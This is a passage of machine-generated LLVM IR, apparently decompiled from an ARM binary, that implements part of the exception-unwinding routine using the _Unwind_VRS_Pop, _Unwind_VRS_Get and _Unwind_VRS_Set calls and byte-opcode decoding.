  br i1 %v0_19758.pr.pr, label %.thread48.dec_label_pc_1975c_crit_edge, label %dec_label_pc_19790

.thread48.dec_label_pc_1975c_crit_edge:           ; preds = %.thread48
  %v0_1975c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1975c

dec_label_pc_1975c:                               ; preds = %.thread48.dec_label_pc_1975c_crit_edge, %dec_label_pc_19748
  %v2_19774 = phi i32 [ %v0_1975c.pre, %.thread48.dec_label_pc_1975c_crit_edge ], [ %v0_19748, %dec_label_pc_19748 ]
  %v1_1975c = add i32 %v2_19774, 9
  %v2_1975c = inttoptr i32 %v1_1975c to i8*
  %v3_1975c = load i8, i8* %v2_1975c, align 1
  %v4_1975c = zext i8 %v3_1975c to i32
  store i32 %v4_1975c, i32* %r3.global-to-local, align 4
  %v2_19760 = icmp eq i8 %v3_1975c, 0
  store i1 %v2_19760, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19760, label %dec_label_pc_197ac, label %dec_label_pc_19770

dec_label_pc_19770:                               ; preds = %dec_label_pc_1975c
  %v1_19770 = add nsw i32 %v4_1975c, -1
  store i32 %v1_19770, i32* %r3.global-to-local, align 4
  %v1_19774 = trunc i32 %v1_19770 to i8
  store i8 %v1_19774, i8* %v2_1975c, align 1
  %v0_19778 = load i32, i32* @r5, align 4
  %v1_19778 = add i32 %v0_19778, 4
  %v2_19778 = inttoptr i32 %v1_19778 to i32*
  %v3_19778 = load i32, i32* %v2_19778, align 4
  store i32 %v3_19778, i32* %r2.global-to-local, align 4
  %v1_1977c = inttoptr i32 %v3_19778 to i32*
  %v2_1977c = load i32, i32* %v1_1977c, align 4
  store i32 %v2_1977c, i32* %r0.global-to-local, align 4
  %v4_1977c = add i32 %v3_19778, 4
  store i32 %v4_1977c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1977c, i32* %v2_19778, align 4
  %v0_19788 = load i32, i32* %r3.global-to-local, align 4
  %v1_19788 = trunc i32 %v0_19788 to i8
  %v2_19788 = load i32, i32* @r5, align 4
  %v3_19788 = add i32 %v2_19788, 8
  %v4_19788 = inttoptr i32 %v3_19788 to i8*
  store i8 %v1_19788, i8* %v4_19788, align 1
  %v0_1978c = load i32, i32* %r0.global-to-local, align 4
  %v1_1978c = load i32, i32* @r5, align 4
  %v2_1978c = inttoptr i32 %v1_1978c to i32*
  store i32 %v0_1978c, i32* %v2_1978c, align 4
  br label %dec_label_pc_19790

dec_label_pc_19790:                               ; preds = %.thread48, %dec_label_pc_19770
  %v0_19790 = load i32, i32* %r0.global-to-local, align 4
  %v3_19790 = udiv i32 %v0_19790, 16777216
  %v1_19794 = urem i32 %v3_19790, 16
  %v3_19798 = mul i32 %v0_19790, 256
  store i32 %v3_19798, i32* %r0.global-to-local, align 4
  %v1_1979c = add nuw nsw i32 %v1_19794, 1
  store i32 %v1_1979c, i32* %r2.global-to-local, align 4
  %v1_197a0 = and i32 %v3_19790, 240
  store i32 %v1_197a0, i32* %r3.global-to-local, align 4
  %v1_197a4 = load i32, i32* @r5, align 4
  %v2_197a4 = inttoptr i32 %v1_197a4 to i32*
  store i32 %v3_19798, i32* %v2_197a4, align 4
  %v0_197a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_197a8 = load i32, i32* %r3.global-to-local, align 4
  %v4_197a8 = mul i32 %v1_197a8, 4096
  %v5_197a8 = or i32 %v4_197a8, %v0_197a8
  br label %dec_label_pc_197ac

dec_label_pc_197ac:                               ; preds = %dec_label_pc_1975c, %dec_label_pc_19790
  %storemerge131 = phi i32 [ %v5_197a8, %dec_label_pc_19790 ], [ 720897, %dec_label_pc_1975c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1962c

dec_label_pc_197b4:                               ; preds = %dec_label_pc_19570
  %v0_197b4 = load i32, i32* @r5, align 4
  %v1_197b4 = add i32 %v0_197b4, 8
  %v2_197b4 = inttoptr i32 %v1_197b4 to i8*
  %v3_197b4 = load i8, i8* %v2_197b4, align 1
  %v4_197b4 = zext i8 %v3_197b4 to i32
  store i32 %v4_197b4, i32* %r3.global-to-local, align 4
  %v2_197b8 = icmp eq i8 %v3_197b4, 0
  store i1 %v2_197b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197b8, label %dec_label_pc_197c8, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_197b4
  %v2_197bc = add nsw i32 %v4_197b4, -1
  store i32 %v2_197bc, i32* %r3.global-to-local, align 4
  %v2_197c0 = trunc i32 %v2_197bc to i8
  store i8 %v2_197c0, i8* %v2_197b4, align 1
  %v0_197c4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_197c4.pr.pr, label %.thread52.dec_label_pc_197c8_crit_edge, label %dec_label_pc_197fc

.thread52.dec_label_pc_197c8_crit_edge:           ; preds = %.thread52
  %v0_197c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_197c8

dec_label_pc_197c8:                               ; preds = %.thread52.dec_label_pc_197c8_crit_edge, %dec_label_pc_197b4
  %v2_197e0 = phi i32 [ %v0_197c8.pre, %.thread52.dec_label_pc_197c8_crit_edge ], [ %v0_197b4, %dec_label_pc_197b4 ]
  %v1_197c8 = add i32 %v2_197e0, 9
  %v2_197c8 = inttoptr i32 %v1_197c8 to i8*
  %v3_197c8 = load i8, i8* %v2_197c8, align 1
  %v4_197c8 = zext i8 %v3_197c8 to i32
  store i32 %v4_197c8, i32* %r3.global-to-local, align 4
  %v2_197cc = icmp eq i8 %v3_197c8, 0
  store i1 %v2_197cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197cc, label %dec_label_pc_19818, label %dec_label_pc_197dc

dec_label_pc_197dc:                               ; preds = %dec_label_pc_197c8
  %v1_197dc = add nsw i32 %v4_197c8, -1
  store i32 %v1_197dc, i32* %r3.global-to-local, align 4
  %v1_197e0 = trunc i32 %v1_197dc to i8
  store i8 %v1_197e0, i8* %v2_197c8, align 1
  %v0_197e4 = load i32, i32* @r5, align 4
  %v1_197e4 = add i32 %v0_197e4, 4
  %v2_197e4 = inttoptr i32 %v1_197e4 to i32*
  %v3_197e4 = load i32, i32* %v2_197e4, align 4
  store i32 %v3_197e4, i32* %r2.global-to-local, align 4
  %v1_197e8 = inttoptr i32 %v3_197e4 to i32*
  %v2_197e8 = load i32, i32* %v1_197e8, align 4
  store i32 %v2_197e8, i32* %r0.global-to-local, align 4
  %v4_197e8 = add i32 %v3_197e4, 4
  store i32 %v4_197e8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_197e8, i32* %v2_197e4, align 4
  %v0_197f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_197f4 = trunc i32 %v0_197f4 to i8
  %v2_197f4 = load i32, i32* @r5, align 4
  %v3_197f4 = add i32 %v2_197f4, 8
  %v4_197f4 = inttoptr i32 %v3_197f4 to i8*
  store i8 %v1_197f4, i8* %v4_197f4, align 1
  %v0_197f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_197f8 = load i32, i32* @r5, align 4
  %v2_197f8 = inttoptr i32 %v1_197f8 to i32*
  store i32 %v0_197f8, i32* %v2_197f8, align 4
  br label %dec_label_pc_197fc

dec_label_pc_197fc:                               ; preds = %.thread52, %dec_label_pc_197dc
  %v0_197fc = load i32, i32* %r0.global-to-local, align 4
  %v3_197fc = udiv i32 %v0_197fc, 16777216
  %v1_19800 = urem i32 %v3_197fc, 16
  %v3_19804 = mul i32 %v0_197fc, 256
  store i32 %v3_19804, i32* %r0.global-to-local, align 4
  %v1_19808 = add nuw nsw i32 %v1_19800, 1
  store i32 %v1_19808, i32* %r2.global-to-local, align 4
  %v1_1980c = and i32 %v3_197fc, 240
  store i32 %v1_1980c, i32* %r3.global-to-local, align 4
  %v1_19810 = load i32, i32* @r5, align 4
  %v2_19810 = inttoptr i32 %v1_19810 to i32*
  store i32 %v3_19804, i32* %v2_19810, align 4
  %v0_19814 = load i32, i32* %r2.global-to-local, align 4
  %v1_19814 = load i32, i32* %r3.global-to-local, align 4
  %v4_19814 = mul i32 %v1_19814, 4096
  %v5_19814 = or i32 %v4_19814, %v0_19814
  br label %dec_label_pc_19818

dec_label_pc_19818:                               ; preds = %dec_label_pc_197c8, %dec_label_pc_197fc
  %storemerge130 = phi i32 [ %v5_19814, %dec_label_pc_197fc ], [ 720897, %dec_label_pc_197c8 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1962c

dec_label_pc_19820:                               ; preds = %dec_label_pc_1954c
  %v0_19820 = load i32, i32* @r5, align 4
  %v1_19820 = add i32 %v0_19820, 8
  %v2_19820 = inttoptr i32 %v1_19820 to i8*
  %v3_19820 = load i8, i8* %v2_19820, align 1
  %v4_19820 = zext i8 %v3_19820 to i32
  store i32 %v4_19820, i32* %r3.global-to-local, align 4
  %v2_19824 = icmp eq i8 %v3_19820, 0
  store i1 %v2_19824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19824, label %dec_label_pc_199cc, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_19820
  %v2_19828 = add nsw i32 %v4_19820, -1
  store i32 %v2_19828, i32* %r3.global-to-local, align 4
  %v2_1982c = trunc i32 %v2_19828 to i8
  store i8 %v2_1982c, i8* %v2_19820, align 1
  %v0_19830.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19830.pr.pr, label %.thread56.dec_label_pc_199cc_crit_edge, label %dec_label_pc_19834

.thread56.dec_label_pc_199cc_crit_edge:           ; preds = %.thread56
  %v0_199cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_199cc

dec_label_pc_19834:                               ; preds = %.thread56, %dec_label_pc_199d8
  %v0_19834 = load i32, i32* %r0.global-to-local, align 4
  %v3_19834 = udiv i32 %v0_19834, 16777216
  store i32 %v3_19834, i32* %r3.global-to-local, align 4
  store i32 %v3_19834, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_19834, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1983c = mul i32 %v0_19834, 256
  store i32 %v3_1983c, i32* %r0.global-to-local, align 4
  %v1_19840 = load i32, i32* @r5, align 4
  %v2_19840 = inttoptr i32 %v1_19840 to i32*
  store i32 %v3_1983c, i32* %v2_19840, align 4
  br i1 %tmp184, label %dec_label_pc_195fc, label %dec_label_pc_19848

dec_label_pc_19848:                               ; preds = %dec_label_pc_19834
  %v0_19848 = load i32, i32* %r3.global-to-local, align 4
  %v1_19848 = and i32 %v0_19848, 240
  store i32 %v1_19848, i32* %r3.global-to-local, align 4
  %v2_19848 = icmp eq i32 %v1_19848, 0
  store i1 %v2_19848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19848, label %dec_label_pc_19850, label %dec_label_pc_195fc

dec_label_pc_19850:                               ; preds = %dec_label_pc_19848
  %v0_19850 = load i32, i32* @r7, align 4
  store i32 %v0_19850, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_19858 = load i32, i32* %r2.global-to-local, align 4
  %v4_19858 = call i32 @_Unwind_VRS_Pop(i32 %v0_19850, i32 4, i32 %v2_19858, i32 0)
  store i32 %v4_19858, i32* %r0.global-to-local, align 4
  %v2_1985c = icmp eq i32 %v4_19858, 0
  store i1 %v2_1985c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1985c, label %dec_label_pc_1932c.backedge, label %dec_label_pc_19864

dec_label_pc_19864:                               ; preds = %dec_label_pc_19850
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19454

dec_label_pc_1986c:                               ; preds = %dec_label_pc_19698
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19878 = load i32, i32* @r7, align 4
  store i32 %v0_19878, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_19884 = call i32 @_Unwind_VRS_Get(i32 %v0_19878, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19884, i32* %r0.global-to-local, align 4
  %v0_19888 = load i32, i32* @r5, align 4
  %v1_19888 = add i32 %v0_19888, 8
  %v2_19888 = inttoptr i32 %v1_19888 to i8*
  %v3_19888 = load i8, i8* %v2_19888, align 1
  %v4_19888 = zext i8 %v3_19888 to i32
  store i32 %v4_19888, i32* %r1.global-to-local, align 4
  %v2_1988c = icmp eq i8 %v3_19888, 0
  store i1 %v2_1988c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1988c, label %dec_label_pc_1989c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1986c
  %v2_19890 = add nsw i32 %v4_19888, -1
  store i32 %v2_19890, i32* %r3.global-to-local, align 4
  %v2_19894 = trunc i32 %v2_19890 to i8
  store i8 %v2_19894, i8* %v2_19888, align 1
  %v0_19898.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19898.pr.pr, label %.thread58.dec_label_pc_1989c_crit_edge, label %dec_label_pc_198c8

.thread58.dec_label_pc_1989c_crit_edge:           ; preds = %.thread58
  %v0_1989c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1989c

dec_label_pc_1989c:                               ; preds = %.thread58.dec_label_pc_1989c_crit_edge, %dec_label_pc_1986c
  %v2_198b0 = phi i32 [ %v0_1989c.pre, %.thread58.dec_label_pc_1989c_crit_edge ], [ %v0_19888, %dec_label_pc_1986c ]
  %v1_1989c = add i32 %v2_198b0, 9
  %v2_1989c = inttoptr i32 %v1_1989c to i8*
  %v3_1989c = load i8, i8* %v2_1989c, align 1
  %v4_1989c = zext i8 %v3_1989c to i32
  store i32 %v4_1989c, i32* %r3.global-to-local, align 4
  %v2_198a0 = icmp eq i8 %v3_1989c, 0
  store i1 %v2_198a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_198a0, label %bb158, label %dec_label_pc_198ac

bb158:                                            ; preds = %dec_label_pc_1989c
  %v1_198a4 = load i32, i32* @r6, align 4
  store i32 %v1_198a4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_198f0

dec_label_pc_198ac:                               ; preds = %dec_label_pc_1989c
  %v1_198ac = add nsw i32 %v4_1989c, -1
  store i32 %v1_198ac, i32* %r3.global-to-local, align 4
  %v1_198b0 = trunc i32 %v1_198ac to i8
  store i8 %v1_198b0, i8* %v2_1989c, align 1
  %v0_198b4 = load i32, i32* @r5, align 4
  %v1_198b4 = add i32 %v0_198b4, 4
  %v2_198b4 = inttoptr i32 %v1_198b4 to i32*
  %v3_198b4 = load i32, i32* %v2_198b4, align 4
  store i32 %v3_198b4, i32* %r2.global-to-local, align 4
  %v1_198b8 = inttoptr i32 %v3_198b4 to i32*
  %v2_198b8 = load i32, i32* %v1_198b8, align 4
  store i32 %v2_198b8, i32* %r0.global-to-local, align 4
  %v4_198b8 = add i32 %v3_198b4, 4
  store i32 %v4_198b8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_198c0 = inttoptr i32 %v0_198b4 to i32*
  store i32 %v2_198b8, i32* %v1_198c0, align 4
  %v5_198c0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_198c0, i32* %v2_198b4, align 4
  %v0_198c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_198c4 = trunc i32 %v0_198c4 to i8
  %v2_198c4 = load i32, i32* @r5, align 4
  %v3_198c4 = add i32 %v2_198c4, 8
  %v4_198c4 = inttoptr i32 %v3_198c4 to i8*
  store i8 %v1_198c4, i8* %v4_198c4, align 1
  br label %dec_label_pc_198c8

dec_label_pc_198c8:                               ; preds = %.thread58, %dec_label_pc_198ac
  %v0_198c8 = load i32, i32* @r5, align 4
  %v1_198c8 = inttoptr i32 %v0_198c8 to i32*
  %v2_198c8 = load i32, i32* %v1_198c8, align 4
  store i32 %v2_198c8, i32* %r3.global-to-local, align 4
  %v3_198cc = mul i32 %v2_198c8, 256
  store i32 %v3_198cc, i32* %r0.global-to-local, align 4
  %v3_198d0 = udiv i32 %v2_198c8, 16777216
  store i32 %v3_198d0, i32* %r2.global-to-local, align 4
  store i32 %v3_198cc, i32* %v1_198c8, align 4
  %v0_198d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_198d8 = and i32 %v0_198d8, 128
  %v2_198d8 = icmp eq i32 %v1_198d8, 0
  store i1 %v2_198d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_198d8, label %.thread129, label %dec_label_pc_198ec

.thread129:                                       ; preds = %dec_label_pc_198c8
  %v4_198dc = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_198dc, i32* %ip.global-to-local, align 4
  %v1_198e0 = urem i32 %v0_198d8, 256
  store i32 %v1_198e0, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_19960

dec_label_pc_198ec:                               ; preds = %dec_label_pc_198c8
  %v1_198e063 = urem i32 %v0_198d8, 256
  store i32 %v1_198e063, i32* %r2.global-to-local, align 4
  %v0_198ec = load i32, i32* @r5, align 4
  %v1_198ec = add i32 %v0_198ec, 8
  %v2_198ec = inttoptr i32 %v1_198ec to i8*
  %v3_198ec = load i8, i8* %v2_198ec, align 1
  %v4_198ec = zext i8 %v3_198ec to i32
  store i32 %v4_198ec, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_198f0

dec_label_pc_198f0:                               ; preds = %bb158, %dec_label_pc_198ec
  %v3_1991099 = phi i32 [ %v2_198b0, %bb158 ], [ %v0_198ec, %dec_label_pc_198ec ]
  %v0_198f892 = phi i32 [ %v1_198a4, %bb158 ], [ %v1_198e063, %dec_label_pc_198ec ]
  %v3_198f0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_198f0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_198f8

dec_label_pc_198f8:                               ; preds = %dec_label_pc_198f8.backedge, %dec_label_pc_198f0
  %v3_19910 = phi i32 [ %v3_19910100, %dec_label_pc_198f8.backedge ], [ %v3_1991099, %dec_label_pc_198f0 ]
  %v0_1990c = phi i32 [ %v2_198fc.pre, %dec_label_pc_198f8.backedge ], [ 2, %dec_label_pc_198f0 ]
  %v0_198fc = phi i32 [ %v0_198fc.pre, %dec_label_pc_198f8.backedge ], [ %v3_198f0, %dec_label_pc_198f0 ]
  %v0_198f8 = phi i32 [ %v0_198f895, %dec_label_pc_198f8.backedge ], [ %v0_198f892, %dec_label_pc_198f0 ]
  %v1_198f8 = urem i32 %v0_198f8, 128
  %v7_198fc = shl i32 %v1_198f8, %v0_1990c
  %v8_198fc = add i32 %v7_198fc, %v0_198fc
  store i32 %v8_198fc, i32* %ip.global-to-local, align 4
  %v0_19900 = load i32, i32* %r1.global-to-local, align 4
  %v2_19900 = icmp eq i32 %v0_19900, 0
  store i1 %v2_19900, i1* %cpsr_z.global-to-local, align 1
  %v1_19904 = add i32 %v0_19900, -1
  store i32 %v1_19904, i32* %r3.global-to-local, align 4
  store i32 %v8_198fc, i32* %stack_var_-36, align 4
  %v1_1990c = add i32 %v0_1990c, 7
  store i32 %v1_1990c, i32* @lr, align 4
  br i1 %v2_19900, label %dec_label_pc_19918, label %bb159

bb159:                                            ; preds = %dec_label_pc_198f8
  %v2_19910 = trunc i32 %v1_19904 to i8
  %v4_19910 = add i32 %v3_19910, 8
  %v5_19910 = inttoptr i32 %v4_19910 to i8*
  store i8 %v2_19910, i8* %v5_19910, align 1
  %v0_19914.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19914.pr, label %.dec_label_pc_19918_crit_edge, label %dec_label_pc_19944

.dec_label_pc_19918_crit_edge:                    ; preds = %bb159
  %v0_19918.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19918

dec_label_pc_19918:                               ; preds = %.dec_label_pc_19918_crit_edge, %dec_label_pc_198f8
  %v2_19930 = phi i32 [ %v0_19918.pre, %.dec_label_pc_19918_crit_edge ], [ %v3_19910, %dec_label_pc_198f8 ]
  %v1_19918 = add i32 %v2_19930, 9
  %v2_19918 = inttoptr i32 %v1_19918 to i8*
  %v3_19918 = load i8, i8* %v2_19918, align 1
  %v4_19918 = zext i8 %v3_19918 to i32
  store i32 %v4_19918, i32* %r3.global-to-local, align 4
  %v2_1991c = icmp eq i8 %v3_19918, 0
  store i1 %v2_1991c, i1* %cpsr_z.global-to-local, align 1
  %v1_19920 = add nsw i32 %v4_19918, -1
  store i32 %v1_19920, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1991c, label %dec_label_pc_198f8.backedge, label %dec_label_pc_1992c

dec_label_pc_1992c:                               ; preds = %dec_label_pc_19918
  %v1_1992c = add i32 %v2_19930, 4
  %v2_1992c = inttoptr i32 %v1_1992c to i32*
  %v3_1992c = load i32, i32* %v2_1992c, align 4
  store i32 %v3_1992c, i32* %r2.global-to-local, align 4
  %v1_19930 = trunc i32 %v1_19920 to i8
  store i8 %v1_19930, i8* %v2_19918, align 1
  %v0_19934 = load i32, i32* %r2.global-to-local, align 4
  %v1_19934 = inttoptr i32 %v0_19934 to i32*
  %v2_19934 = load i32, i32* %v1_19934, align 4
  store i32 %v2_19934, i32* %r0.global-to-local, align 4
  %v4_19934 = add i32 %v0_19934, 4
  store i32 %v4_19934, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1993c = load i32, i32* @r5, align 4
  %v3_1993c = add i32 %v2_1993c, 8
  %v4_1993c = inttoptr i32 %v3_1993c to i8*
  store i8 3, i8* %v4_1993c, align 1
  %v0_19940 = load i32, i32* @r5, align 4
  %v1_19940 = inttoptr i32 %v0_19940 to i32*
  %v2_19940 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_19940, i32* %v1_19940, align 4
  %v3_19940 = add i32 %v0_19940, 4
  %v4_19940 = inttoptr i32 %v3_19940 to i32*
  %v5_19940 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19940, i32* %v4_19940, align 4
  br label %dec_label_pc_19944

dec_label_pc_19944:                               ; preds = %bb159, %dec_label_pc_1992c
  %v0_19944 = load i32, i32* @r5, align 4
  %v1_19944 = inttoptr i32 %v0_19944 to i32*
  %v2_19944 = load i32, i32* %v1_19944, align 4
  store i32 %v2_19944, i32* %r3.global-to-local, align 4
  %v3_19948 = udiv i32 %v2_19944, 16777216
  store i32 %v3_19948, i32* %r2.global-to-local, align 4
  %v1_1994c = and i32 %v3_19948, 128
  %v2_1994c = icmp eq i32 %v1_1994c, 0
  store i1 %v2_1994c, i1* %cpsr_z.global-to-local, align 1
  %v3_19950 = mul i32 %v2_19944, 256
  store i32 %v3_19950, i32* %r0.global-to-local, align 4
  store i32 %v3_19950, i32* %v1_19944, align 4
  %v0_19958 = load i32, i32* %r2.global-to-local, align 4
  %v1_19958 = urem i32 %v0_19958, 256
  store i32 %v1_19958, i32* %r2.global-to-local, align 4
  br i1 %v2_1994c, label %dec_label_pc_19960.loopexit, label %dec_label_pc_1998c

dec_label_pc_19960.loopexit:                      ; preds = %dec_label_pc_19944
  %v0_19964.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_19968.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19960

dec_label_pc_19960:                               ; preds = %dec_label_pc_19960.loopexit, %.thread129
  %v2_19968 = phi i32 [ 2, %.thread129 ], [ %v2_19968.pre, %dec_label_pc_19960.loopexit ]
  %v0_19964 = phi i32 [ %v4_198dc, %.thread129 ], [ %v0_19964.pre, %dec_label_pc_19960.loopexit ]
  %v0_19960 = phi i32 [ %v1_198e0, %.thread129 ], [ %v1_19958, %dec_label_pc_19960.loopexit ]
  %v1_19960 = urem i32 %v0_19960, 128
  %v1_19964 = add i32 %v0_19964, 516
  %v7_19968 = shl i32 %v1_19960, %v2_19968
  %v8_19968 = add i32 %v1_19964, %v7_19968
  store i32 %v8_19968, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19970 = load i32, i32* @r7, align 4
  store i32 %v0_19970, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_19968, i32* %stack_var_-36, align 4
  %v5_19984 = call i32 @_Unwind_VRS_Set(i32 %v0_19970, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19984, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1932c.backedge

dec_label_pc_1998c:                               ; preds = %dec_label_pc_19944
  %v0_1998c = load i32, i32* @r5, align 4
  %v1_1998c = add i32 %v0_1998c, 8
  %v2_1998c = inttoptr i32 %v1_1998c to i8*
  %v3_1998c = load i8, i8* %v2_1998c, align 1
  %v4_1998c = zext i8 %v3_1998c to i32
  store i32 %v4_1998c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_198f8.backedge

dec_label_pc_198f8.backedge:                      ; preds = %dec_label_pc_1998c, %dec_label_pc_19918
  %v3_19910100 = phi i32 [ %v0_1998c, %dec_label_pc_1998c ], [ %v2_19930, %dec_label_pc_19918 ]
  %v0_198f895 = phi i32 [ %v1_19958, %dec_label_pc_1998c ], [ 176, %dec_label_pc_19918 ]
  %v0_198fc.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_198fc.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_198f8

dec_label_pc_19994:                               ; preds = %dec_label_pc_19690
  %v0_19994 = load i32, i32* @r5, align 4
  %v1_19994 = add i32 %v0_19994, 8
  %v2_19994 = inttoptr i32 %v1_19994 to i8*
  %v3_19994 = load i8, i8* %v2_19994, align 1
  %v4_19994 = zext i8 %v3_19994 to i32
  store i32 %v4_19994, i32* %r3.global-to-local, align 4
  %v2_19998 = icmp eq i8 %v3_19994, 0
  store i1 %v2_19998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19998, label %dec_label_pc_199fc, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_19994
  %v2_1999c = add nsw i32 %v4_19994, -1
  store i32 %v2_1999c, i32* %r3.global-to-local, align 4
  %v2_199a0 = trunc i32 %v2_1999c to i8
  store i8 %v2_199a0, i8* %v2_19994, align 1
  %v0_199a4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_199a4.pr.pr, label %.thread66.dec_label_pc_199fc_crit_edge, label %dec_label_pc_199a8

.thread66.dec_label_pc_199fc_crit_edge:           ; preds = %.thread66
  %v0_199fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_199fc

dec_label_pc_199a8:                               ; preds = %.thread66, %dec_label_pc_19a08
  %v0_199a8 = load i32, i32* %r0.global-to-local, align 4
  %v3_199a8 = udiv i32 %v0_199a8, 16777216
  store i32 %v3_199a8, i32* %r3.global-to-local, align 4
  store i32 %v3_199a8, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_199a8, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_199b0 = mul i32 %v0_199a8, 256
  store i32 %v3_199b0, i32* %r0.global-to-local, align 4
  %v1_199b4 = load i32, i32* @r5, align 4
  %v2_199b4 = inttoptr i32 %v1_199b4 to i32*
  store i32 %v3_199b0, i32* %v2_199b4, align 4
  br i1 %tmp185, label %dec_label_pc_195fc, label %dec_label_pc_199bc

dec_label_pc_199bc:                               ; preds = %dec_label_pc_199a8
  %v0_199bc = load i32, i32* %r3.global-to-local, align 4
  %v1_199bc = and i32 %v0_199bc, 240
  store i32 %v1_199bc, i32* %r1.global-to-local, align 4
  %v2_199bc = icmp eq i32 %v1_199bc, 0
  store i1 %v2_199bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_199bc, label %dec_label_pc_199bc.dec_label_pc_1962c_crit_edge, label %dec_label_pc_199c4

dec_label_pc_199bc.dec_label_pc_1962c_crit_edge:  ; preds = %dec_label_pc_199bc
  %v2_19634.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1962c

dec_label_pc_199c4:                               ; preds = %dec_label_pc_199bc
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19454

dec_label_pc_199cc:                               ; preds = %.thread56.dec_label_pc_199cc_crit_edge, %dec_label_pc_19820
  %v2_199dc = phi i32 [ %v0_199cc.pre, %.thread56.dec_label_pc_199cc_crit_edge ], [ %v0_19820, %dec_label_pc_19820 ]
  %v1_199cc = add i32 %v2_199dc, 9
  %v2_199cc = inttoptr i32 %v1_199cc to i8*
  %v3_199cc = load i8, i8* %v2_199cc, align 1
  %v4_199cc = zext i8 %v3_199cc to i32
  store i32 %v4_199cc, i32* %r3.global-to-local, align 4
  %v2_199d0 = icmp eq i8 %v3_199cc, 0
  store i1 %v2_199d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_199d0, label %dec_label_pc_195fc, label %dec_label_pc_199d8

dec_label_pc_199d8:                               ; preds = %dec_label_pc_199cc
  %v1_199d8 = add nsw i32 %v4_199cc, -1
  store i32 %v1_199d8, i32* %r3.global-to-local, align 4
  %v1_199dc = trunc i32 %v1_199d8 to i8
  store i8 %v1_199dc, i8* %v2_199cc, align 1
  %v0_199e0 = load i32, i32* @r5, align 4
  %v1_199e0 = add i32 %v0_199e0, 4
  %v2_199e0 = inttoptr i32 %v1_199e0 to i32*
  %v3_199e0 = load i32, i32* %v2_199e0, align 4
  store i32 %v3_199e0, i32* %r2.global-to-local, align 4
  %v1_199e4 = inttoptr i32 %v3_199e0 to i32*
  %v2_199e4 = load i32, i32* %v1_199e4, align 4
